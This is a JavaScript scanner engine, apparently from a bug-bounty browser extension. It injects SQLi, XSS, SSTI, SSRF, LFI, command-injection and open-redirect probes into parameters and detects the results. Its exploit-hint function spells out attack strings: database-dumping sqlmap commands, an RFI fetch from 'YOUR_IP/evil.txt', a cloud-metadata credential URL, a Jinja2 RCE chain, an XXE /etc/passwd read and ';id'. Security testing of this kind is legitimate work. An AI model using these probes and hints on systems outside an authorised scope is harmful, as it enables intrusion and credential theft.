// BountyScope — active scanner engine (ported from ReconSpider Pro v10).
// Fixes applied vs the original:
//   D2  — redirect:'follow' + final-URL redirect detection (the old
//         redirect:'manual' produced opaqueredirect responses that broke
//         open-redirect detection AND every probe on redirecting endpoints).
//   D14 — Blind_XSS payloads only run when a canary collector URL is provided;
//         CANARY placeholders are replaced at queue-build time.
// Runs in the popup context (classic script; globals BS_PAYLOADS / BS_DETECT).
// The popup pre-filters params to the user's scope — the engine fires only at
// URLs it was given.
'use strict';

let _scanning = false;
let _stopped  = false;
let _results  = [];
let _queue    = [];
let _done     = 0;
let _total    = 0;
let _onProgress = null;
let _onResult   = null;
let _onDone     = null;

// ── Entry point ──────────────────────────────────────────────────────────────
async function runActiveScan(params, options, callbacks) {
  if (_scanning) return;
  _scanning = true;
  _stopped  = false;
  _results  = [];
  _queue    = [];
  _done     = 0;

  _onProgress = callbacks.onProgress || function () {};
  _onResult   = callbacks.onResult   || function () {};
  _onDone     = callbacks.onDone     || function () {};

  const types       = options.types       || ['SQLi_ERROR', 'XSS', 'LFI', 'SSTI', 'SSRF', 'OS_CMD', 'OPEN_REDIRECT'];
  const delay       = options.delay       || 500;
  const timeout     = options.timeout     || 9000;
  const concurrency = Math.min(Math.max(options.concurrency || 2, 1), 8);
  const canary      = (options.canary || '').trim();
  const effective   = canary ? types : types.filter((t) => t !== 'Blind_XSS');

  for (const param of params) {
    if (_stopped) break;
    if (!param || !param.url) continue;
    const src = param.source || '';
    // Not real HTTP injection points — skip
    if (['js_analysis', 'window_config', 'data_attribute', 'cookie', 'html_comment'].includes(src)) continue;
    let vulnTypes;
    if (options.smartMode) {
      const base = relevantTypes(param).filter((t) => effective.includes(t));
      // Param-agnostic types always apply: boolean/time SQLi (and blind XSS
      // whenever a canary is configured — effective already gates it).
      vulnTypes = [...new Set([...base, 'SQLi_BOOLEAN', 'SQLi_TIME', ...(effective.includes('Blind_XSS') ? ['Blind_XSS'] : [])])];
    } else {
      vulnTypes = effective;
    }

    // Rebuild POST/GraphQL bodies with captured sibling fields so single-field
    // injection keeps the rest of the original request intact.
    const bodyCtx = {};
    if (/json|graphql/i.test(param.source || '')) {
      for (const p2 of params) {
        if (p2 && p2.url === param.url && p2.source === param.source && p2.name) {
          bodyCtx[p2.name] = String(p2.value || '');
        }
      }
    }

    for (const vtype of vulnTypes) {
      if (!BS_PAYLOADS[vtype]) continue;
      const extra = (options.extraPayloads && options.extraPayloads[vtype]) || [];
      for (const payload of [...BS_PAYLOADS[vtype], ...extra]) {
        if (payload && typeof payload === 'object' && payload.a) {
          _queue.push({ param, vtype, payload, mode: 'boolean', bodyCtx });
        } else if (vtype === 'SQLi_TIME') {
          _queue.push({ param, vtype, payload: String(payload), mode: 'time', bodyCtx });
        } else if (vtype === 'Blind_XSS') {
          _queue.push({ param, vtype, payload: String(payload).replace(/CANARY/g, canary), mode: 'probe', canary, bodyCtx });
        } else {
          _queue.push({ param, vtype, payload: String(payload), mode: 'probe', bodyCtx });
        }
      }
    }
  }

  _total = _queue.length;
  _onProgress({ done: 0, total: _total, scanning: true, message: 'Preparing ' + _total + ' tests…' });

  const workers = [];
  for (let i = 0; i < concurrency; i++) workers.push(runWorker(delay, timeout));
  await Promise.all(workers);

  _scanning = false;
  _onDone({ results: _results, total: _total, done: _done });
}

async function runWorker(delay, timeout) {
  while (_queue.length > 0 && !_stopped) {
    const job = _queue.shift();
    if (!job) break;
    try {
      if      (job.mode === 'boolean') await runBooleanJob(job, timeout);
      else if (job.mode === 'time')    await runTimeJob(job, timeout);
      else                             await runProbeJob(job, timeout);
    } catch (_) {}
    _done++;
    _onProgress({
      done: _done, total: _total, scanning: true,
      message: 'Testing ' + job.param.name + ' [' + job.vtype + '] — ' + _results.length + ' found',
    });
    await sleep(delay);
  }
}

// ── Job runners ──────────────────────────────────────────────────────────────
async function runProbeJob(job, timeout) {
  const { param, vtype, payload, bodyCtx } = job;
  try {
    const origValue = param.value || '1';
    const { url: baseUrl, body: baseBody, method: baseMethod } = buildRequest(param, origValue, bodyCtx);
    const baselineResp = await makeRequest(baseUrl, baseMethod, baseBody, timeout);
    if (!baselineResp) return;
    const baselineBody = baselineResp.body;

    const { url, body, method, injectHeader } = buildRequest(param, payload, bodyCtx);
    const resp = await makeRequest(url, method, body, timeout, injectHeader);
    if (!resp) return;

    const respBody = resp.body;
    const status   = resp.status;

    // ── SSTI: math evaluation detection ────────────────────────────────────
    if (vtype === 'SSTI') {
      // Sound detection only: the evaluated RESULT ({{8*9}}→72, {{7*7}}→49) must
      // appear in the response but not the baseline. The payload's own digits
      // never contain the result, so plain reflection cannot false-positive.
      for (const [evalNum, re] of [['72', /\b72\b/], ['49', /\b49\b/]]) {
        if (re.test(respBody) && !re.test(baselineBody)) {
          reportFinding(param, vtype, payload, {
            evidence: 'Template expression evaluated: ' + payload + ' → "' + evalNum + '" appeared in response (not in baseline)',
            status, url: resp.finalUrl || url, type: 'evaluated',
          });
          return;
        }
      }
      for (const sig of BS_DETECT.SSTI.slice(2)) {
        if (sig.test(respBody) && !sig.test(baselineBody)) {
          reportFinding(param, vtype, payload, {
            evidence: extractEvidence(respBody, sig), status,
            url: resp.finalUrl || url, type: 'engine_error',
          });
          return;
        }
      }
      return;
    }

    // ── XSS ────────────────────────────────────────────────────────────────
    if (vtype === 'XSS') {
      // Reflection only counts in HTML responses — a JSON/XML API echoing the
      // payload verbatim is not XSS (the old code marked any echo CONFIRMED).
      const ct = resp.contentType || '';
      const looksHtml = /text\/html|application\/xhtml/i.test(ct) || ct === '';
      if (looksHtml) for (const sig of BS_DETECT.XSS_REFLECT) {
        if (sig.test(respBody) && !sig.test(baselineBody)) {
          reportFinding(param, vtype, payload, {
            evidence: 'Unescaped HTML tag reflected: ' + extractEvidence(respBody, sig),
            status, url: resp.finalUrl || url, type: 'reflected_unescaped',
          });
          return;
        }
      }
      const safePayload = payload.replace(/[.*+?^${}()|[\]\\]/g, '\\$&');
      if (looksHtml && new RegExp(safePayload, 'i').test(respBody) && !new RegExp(safePayload, 'i').test(baselineBody)) {
        reportFinding(param, vtype, payload, {
          evidence: 'Payload reflected verbatim in HTML response — reflection OBSERVED, not confirmed execution (check context/encoding/CSP manually)',
          status, url: resp.finalUrl || url, type: 'reflected_observed', severity: 'LOW',
        });
        return;
      }
      return;
    }

    // ── Blind XSS ──────────────────────────────────────────────────────────
    if (vtype === 'Blind_XSS') {
      const ch = job.canary ? payloadHostOf(job.canary) : null;
      if (ch && respBody.includes(ch)) {
        reportFinding(param, vtype, payload, {
          evidence: 'Blind XSS canary host "' + ch + '" reflected — check your collector for OOB callbacks',
          status, url: resp.finalUrl || url, type: 'blind_reflected',
        });
      }
      return;
    }

    // ── Open Redirect (D2 fix: follow redirects, check final URL) ──────────
    if (vtype === 'OPEN_REDIRECT') {
      const ph = payloadHostOf(payload);
      const redirectedTo = resp.redirectedTo || '';
      if (ph && redirectedTo && redirectedTo.includes(ph)) {
        reportFinding(param, vtype, payload, {
          evidence: 'Redirected off-origin to: ' + redirectedTo, status,
          url: resp.finalUrl || url, type: 'followed_redirect',
        });
        return;
      }
      let leftOrigin = false;
      try { leftOrigin = new URL(resp.finalUrl).host !== new URL(url).host; } catch (_) {}
      if (ph && leftOrigin && resp.finalUrl.includes(ph)) {
        reportFinding(param, vtype, payload, {
          evidence: 'Final URL left origin: ' + resp.finalUrl, status,
          url: resp.finalUrl || url, type: 'followed_redirect',
        });
        return;
      }
      if (BS_DETECT.OPEN_REDIRECT[0].test(respBody) && !BS_DETECT.OPEN_REDIRECT[0].test(baselineBody)) {
        reportFinding(param, vtype, payload, {
          evidence: 'evil.com found in response body — JS/meta redirect likely',
          status, url: resp.finalUrl || url, type: 'body_redirect',
        });
        return;
      }
      return;
    }

    // ── Signature-based detection (baseline-excluded) ──────────────────────
    const sigs = BS_DETECT[vtype] || BS_DETECT.SQLi_ERROR;
    for (const sig of sigs) {
      if (sig.test(respBody) && !sig.test(baselineBody)) {
        reportFinding(param, vtype, payload, {
          evidence: extractEvidence(respBody, sig),
          status, url: resp.finalUrl || url, type: 'signature_match',
        });
        return;
      }
    }

    // ── SQLi_ERROR: 5xx + vendor error, status changed from baseline ───────
    if (vtype === 'SQLi_ERROR' && (status === 500 || status === 503) && baselineResp.status < 500) {
      const vendorErr = /SQL syntax|ORA-\d|ODBC.*Driver|PostgreSQL.*ERROR|SQLite.*error|MySQLSyntaxError|Incorrect syntax near|Unclosed quotation/i;
      if (vendorErr.test(respBody)) {
        reportFinding(param, vtype, payload, {
          evidence: 'HTTP ' + status + ' with DB vendor error (baseline status: ' + baselineResp.status + ')',
          status, url: resp.finalUrl || url, type: 'error_500_vendor', severity: 'HIGH',
        });
      }
    }
  } catch (_) {}
}

async function runBooleanJob(job, timeout) {
  const { param, payload, bodyCtx } = job;
  try {
    const { url: urlA, body: bodyA, method } = buildRequest(param, payload.a, bodyCtx);
    const { url: urlB, body: bodyB } = buildRequest(param, payload.b, bodyCtx);
    const deltas = [];
    for (let round = 0; round < 3; round++) {
      const [respA, respB] = await Promise.all([
        makeRequest(urlA, method, bodyA, timeout),
        makeRequest(urlB, method, bodyB, timeout),
      ]);
      if (!respA || !respB) return;
      const diff = Math.abs(respA.body.length - respB.body.length);
      const pct  = diff / Math.max(respA.body.length, respB.body.length, 1);
      deltas.push(pct);
      await sleep(200);
    }
    const allSignificant = deltas.every((d) => d >= 0.20);
    const avgDelta = deltas.reduce((s, d) => s + d, 0) / deltas.length;
    if (allSignificant) {
      reportFinding(param, 'SQLi_BOOLEAN', payload.a + ' vs ' + payload.b, {
        evidence: 'Response length differs by ' + Math.round(avgDelta * 100) + '% between true/false across 3 consecutive rounds',
        status: 200, url: urlA, type: 'boolean_verified',
      });
    }
  } catch (_) {}
}

async function runTimeJob(job, timeout) {
  const { param, payload, bodyCtx } = job;
  try {
    const baseTimes = [];
    for (let i = 0; i < 3; i++) {
      const { url: bUrl, body: bBody, method: bMeth } = buildRequest(param, param.value || '1', bodyCtx);
      const t0 = Date.now();
      await makeRequest(bUrl, bMeth, bBody, timeout);
      baseTimes.push(Date.now() - t0);
      await sleep(100);
    }
    const baselineMax = Math.max(...baseTimes);
    const baselineAvg = baseTimes.reduce((s, t) => s + t, 0) / baseTimes.length;

    const SLEEP_SECONDS = extractSleepSeconds(payload);
    const expectedDelay = Math.max(SLEEP_SECONDS * 1000, 5000);
    const threshold     = baselineMax + expectedDelay - 500;

    const { url, body, method } = buildRequest(param, payload, bodyCtx);
    const t1 = Date.now();
    await makeRequest(url, method, body, Math.max(timeout, expectedDelay + 5000));
    const elapsed = Date.now() - t1;

    if (elapsed >= threshold && elapsed > baselineAvg + 3000) {
      // Second consecutive delayed hit required — a single slow response on a
      // jittery target is not evidence (the old single-shot overreported).
      await sleep(300);
      const t2 = Date.now();
      await makeRequest(url, method, body, Math.max(timeout, expectedDelay + 5000));
      const elapsed2 = Date.now() - t2;
      if (elapsed2 >= threshold && elapsed2 > baselineAvg + 3000) {
        reportFinding(param, 'SQLi_TIME', payload, {
          evidence: 'Response delayed ' + elapsed + 'ms then ' + elapsed2 + 'ms (3× baseline max: ' + baselineMax + 'ms, avg: ' + Math.round(baselineAvg) + 'ms) — 2 consecutive delayed hits',
          status: 200, url, type: 'time_verified_double', severity: 'CRITICAL',
        });
      }
    }
  } catch (_) {}
}

function extractSleepSeconds(payload) {
  const m = String(payload).match(/sleep\((\d+)\)|SLEEP\((\d+)\)|DELAY\s+'[^']*:(\d+)'|pg_sleep\((\d+)\)|receive_message\([^,]+,(\d+)\)/i);
  if (m) return parseInt(m[1] || m[2] || m[3] || m[4] || m[5] || '5');
  return 5;
}

// ── Request builder ──────────────────────────────────────────────────────────
function buildRequest(param, payload, bodyCtx) {
  const src    = param.source || 'url_parameter';
  const method = (param.method || 'GET').toUpperCase();

  // Path-segment injection: substitute the actual segment the param was derived
  // from — query-string injection never reaches a path-based sink.
  if (src === 'path_segment') {
    try {
      const u = new URL(param.url);
      const orig = String(param.value || '');
      const segs = u.pathname.split('/');
      let idx = -1;
      for (let i = 1; i < segs.length; i++) {
        let dec = segs[i];
        try { dec = decodeURIComponent(segs[i]); } catch (_) {}
        if (dec === orig) { idx = i; break; }
      }
      if (idx > 0) {
        segs[idx] = encodeURIComponent(payload);
        u.pathname = segs.join('/');
        return { url: u.href, body: null, method: 'GET' };
      }
    } catch (_) {}
    // Fallback: cannot locate the segment — fall back to query-string injection.
    try {
      const u = new URL(param.url);
      u.searchParams.set(param.name || param.key, payload);
      return { url: u.href, body: null, method: 'GET' };
    } catch (_) {
      return { url: param.url, body: null, method: 'GET' };
    }
  }

  if (['url_parameter', 'anchor_href', 'LINK', 'hash_parameter'].includes(src)) {
    try {
      const u = new URL(param.url);
      u.searchParams.set(param.name || param.key, payload);
      return { url: u.href, body: null, method: 'GET' };
    } catch (_) {
      return { url: param.url, body: null, method: 'GET' };
    }
  }
  if (src === 'post_form' || src === 'POST-FORM' || src === 'XHR-FORM' || src === 'FORM') {
    const fd = new URLSearchParams();
    fd.set(param.name || param.key, payload);
    return { url: param.url, body: fd.toString(), method: 'POST' };
  }
  if (src === 'post_json' || src === 'POST-JSON' || src === 'XHR-JSON' || src === 'graphql') {
    const ctx = bodyCtx || {};
    if (src === 'graphql') {
      // Rebuild a valid GraphQL request: keep the captured query, reconstruct
      // variables from captured var.* fields with the target field replaced.
      const variables = {};
      for (const [k, v] of Object.entries(ctx)) {
        if (k === 'gql_query' || k === 'gql_operation' || !k.startsWith('var.')) continue;
        setPath(variables, k.slice(4).split('.'), k === param.name ? payload : v);
      }
      const body = { query: ctx.gql_query || 'query { __typename }', variables };
      const opName = param.name === 'gql_operation' ? payload : ctx.gql_operation;
      if (opName) body.operationName = opName;
      return { url: param.url, body: JSON.stringify(body), method: 'POST' };
    }
    const obj = Object.assign({}, ctx, { [param.name || param.key]: payload });
    return { url: param.url, body: JSON.stringify(obj), method: 'POST' };
  }
  if (src === 'xml_body') {
    const name = param.name || param.key;
    const xmlBody = '<?xml version="1.0"?><request><' + name + '>' + payload + '</' + name + '></request>';
    return { url: param.url, body: xmlBody, method: 'POST' };
  }
  if (src === 'request_header') {
    return { url: param.url, body: null, method: 'GET', injectHeader: { name: param.name || param.key, value: payload } };
  }
  try {
    const u = new URL(param.url);
    u.searchParams.set(param.name || param.key, payload);
    return { url: u.href, body: null, method: 'GET' };
  } catch (_) {
    return { url: param.url, body: null, method: 'GET' };
  }
}

// ── HTTP engine (D2 fix: follow redirects, read final URL) ───────────────────
async function makeRequest(url, method, body, timeout, injectHeader) {
  const ctrl = new AbortController();
  const tid  = setTimeout(() => ctrl.abort(), timeout);
  try {
    const headers = {
      'Accept':          'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
      'Accept-Language': 'en-US,en;q=0.5',
    };
    if (injectHeader) headers[injectHeader.name] = injectHeader.value;
    if (body) {
      if (typeof body === 'string' && body.trimStart().startsWith('{')) headers['Content-Type'] = 'application/json';
      else if (typeof body === 'string' && body.trimStart().startsWith('<?xml')) headers['Content-Type'] = 'application/xml';
      else if (typeof body === 'string') headers['Content-Type'] = 'application/x-www-form-urlencoded';
    }
    const resp = await fetch(url, {
      method: method || 'GET',
      signal: ctrl.signal,
      redirect: 'follow',
      credentials: 'include',
      headers,
      body: body || undefined,
    });
    const text = await resp.text();
    clearTimeout(tid);
    let redirectedTo = null;
    try {
      const fin = new URL(resp.url);
      const req = new URL(url);
      if (fin.host !== req.host) redirectedTo = fin.href;
    } catch (_) {}
    return {
      status: resp.status,
      body: text,
      contentType: resp.headers.get('content-type') || '',
      finalUrl: resp.url || url,
      redirectedTo,
      headers: resp.headers,
    };
  } catch (e) {
    clearTimeout(tid);
    return null;
  }
}

// ── Findings ─────────────────────────────────────────────────────────────────
function reportFinding(param, vtype, payload, details) {
  const key = (param.url || '').split('?')[0] + '|' + (param.name || param.key || '') + '|' + vtype;
  if (_results.some((r) => r.key === key)) return;
  const finding = {
    key,
    type:          vtype,
    severity:      details.severity || severityOf(vtype),
    param:         param.name || param.key || '',
    value:         param.value,
    url:           details.url || param.url,
    payload:       String(payload).slice(0, 300),
    evidence:      details.evidence || '',
    detectionType: details.type || 'signature_match',
    source:        param.source,
    method:        param.method || 'GET',
    confirmed:     true,
    exploitHint:   buildExploitHint(vtype, param, payload),
    timestamp:     Date.now(),
  };
  _results.push(finding);
  _onResult(finding);
}

function buildExploitHint(vtype, param, payload) {
  const p = param.name || param.key || '';
  const u = (param.url || '').split('?')[0];
  switch (vtype) {
    case 'SQLi_ERROR':
      return 'sqlmap -u "' + param.url + '" -p "' + p + '" --level=5 --risk=3 --batch --random-agent --dbs --technique=BEUST';
    case 'SQLi_BOOLEAN':
      return 'sqlmap -u "' + param.url + '" -p "' + p + '" --technique=B --level=5 --risk=2 --batch --dbs';
    case 'SQLi_TIME':
      return 'sqlmap -u "' + param.url + '" -p "' + p + '" --technique=T --time-sec=5 --level=5 --batch --random-agent --dbs';
    case 'XSS':
    case 'Blind_XSS':
      return 'dalfox url "' + param.url + '" --param ' + p + ' --silence; for blind XSS wait on your collector';
    case 'LFI':
      return 'ffuf -u "' + u + '?' + p + '=FUZZ" -w LFI-wordlist.txt -mc 200; try php://filter/convert.base64-encode/resource=/etc/passwd';
    case 'RFI':
      return 'Host a payload on your server, then: ' + u + '?' + p + '=http://YOUR_IP/evil.txt';
    case 'OS_CMD':
      return 'Try: ' + u + '?' + p + '=%3Bid — chain with ;|`$( ) delimiters';
    case 'SSTI':
      return "Jinja2 RCE: {{''.__class__.__mro__[2].__subclasses__()}} — try engine-specific payloads";
    case 'SSRF':
      return 'Read metadata: ' + u + '?' + p + '=http://169.254.169.254/latest/meta-data/iam/security-credentials/';
    case 'OPEN_REDIRECT':
      return 'Chain: ' + u + '?' + p + '=https://evil.com — combine with OAuth redirect_uri flaws';
    case 'XXE':
      return 'Extract files: <!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]> — OOB via Collaborator DTD';
    default:
      return 'Manual investigation needed. Param: ' + p + ', URL: ' + u;
  }
}

function severityOf(vtype) {
  const crit = ['SQLi_TIME', 'OS_CMD', 'RCE', 'XXE', 'SSRF'];
  const high = ['SQLi_ERROR', 'SQLi_BOOLEAN', 'LFI', 'RFI', 'SSTI'];
  const med  = ['XSS', 'Blind_XSS', 'OPEN_REDIRECT'];
  if (crit.includes(vtype)) return 'CRITICAL';
  if (high.includes(vtype)) return 'HIGH';
  if (med.includes(vtype))  return 'MEDIUM';
  return 'HIGH';
}

function relevantTypes(param) {
  const n = (param.name || param.key || '').toLowerCase();
  const types = new Set(['SQLi_ERROR', 'XSS']);
  if (/file|path|dir|load|include|require|resource|template|doc|src|page|view/.test(n)) { types.add('LFI'); types.add('RFI'); }
  if (/url|redirect|callback|dest|next|goto|src|source|ref|forward|webhook|proxy|return|location/.test(n)) { types.add('SSRF'); types.add('OPEN_REDIRECT'); }
  if (/template|tpl|render|engine|expression|view|layout|format|theme/.test(n)) types.add('SSTI');
  if (/cmd|command|exec|run|shell|ping|host|query|system|eval|spawn|proc/.test(n)) types.add('OS_CMD');
  if (/xml|soap|body|data|payload|input/.test(n)) types.add('XXE');
  return [...types];
}

function extractEvidence(body, sig) {
  const match = sig.exec(body);
  if (!match) return 'Pattern matched in response';
  const idx = match.index;
  return '…' + body.substring(Math.max(0, idx - 40), idx + 120).replace(/\s+/g, ' ').trim() + '…';
}

function payloadHostOf(p) {
  const m = String(p || '').match(/(?:https?:)?\/\/+([^\\\/'"?]+)/i);
  return m ? m[1].replace(/%2F/i, '') : null;
}

// Assign a value at a dotted path inside a nested object ("a.b" → obj.a.b)
function setPath(obj, keys, value) {
  let cur = obj;
  for (let i = 0; i < keys.length - 1; i++) {
    const k = String(keys[i]).replace(/\[\d+\]$/, '');
    if (typeof cur[k] !== 'object' || cur[k] === null) cur[k] = {};
    cur = cur[k];
  }
  cur[String(keys[keys.length - 1]).replace(/\[\d+\]$/, '')] = value;
}

function sleep(ms) { return new Promise((r) => setTimeout(r, ms)); }

// ── Public API ───────────────────────────────────────────────────────────────
function stopActiveScan() { _stopped = true; }
function isScanRunning()  { return _scanning; }
function getScanResults() { return _results; }
